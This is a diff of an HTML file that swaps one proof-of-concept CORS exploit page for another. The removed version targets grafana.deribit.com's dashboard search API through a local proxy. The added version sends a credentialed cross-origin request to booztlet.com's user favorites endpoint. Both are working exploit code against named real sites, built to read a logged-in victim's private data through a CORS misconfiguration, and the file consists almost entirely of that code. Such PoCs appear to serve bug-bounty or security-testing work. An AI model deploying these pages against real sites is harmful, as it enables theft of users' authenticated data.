@@ -1,44 +1,34 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Exploit for grafana.deribit.com using Proxy</title>
-</head>
-<body>
-
-<h1>Exploit for CORS on grafana.deribit.com (via Proxy)</h1>
-
-<button id="exploitButton">Access Grafana Dashboard</button>
-
-<script>
-  document.getElementById('exploitButton').addEventListener('click', function () {
-    // URL of the target endpoint
-    const targetUrl = 'https://grafana.deribit.com/api/search';
-
-    // URL of the proxy server
-    const proxyUrl = `http://localhost:8082/proxy?url=${encodeURIComponent(targetUrl)}`;
-
-    fetch(proxyUrl, {
-      method: 'GET',
-      credentials: 'include' // Ensures cookies are sent
-    })
+  <head>
+    <meta charset="UTF-8">
+    <title>CORS PoC</title>
+  </head>
+  <body>
+    <script>
+      // Attempt a cross-origin GET request to the favorites endpoint
+      fetch("https://www.booztlet.com/eu/en/api/me/favorites", {
+        method: "GET",
+        // Include credentials (cookies) in the request
+        credentials: "include",
+        // You can set simple headers. Many headers (like User-Agent or Cookie) are managed by the browser.
+        headers: {
+          "Accept": "application/json, text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        }
+      })
       .then(response => {
         if (!response.ok) {
-          throw new Error(`HTTP error! Status: ${response.status}`);
+          throw new Error("Network response was not ok: " + response.statusText);
         }
+        // Assuming the response is JSON. Change as needed.
         return response.json();
       })
       .then(data => {
-        console.log('Data retrieved via proxy:', data);
-        alert('Data retrieved: ' + JSON.stringify(data));
+        console.log("Response data:", data);
       })
       .catch(error => {
-        console.error('Error:', error);
-        alert('Failed to fetch data via proxy.');
+        console.error("Fetch error:", error);
       });
-  });
-</script>
-
-</body>
+    </script>
+  </body>
 </html>
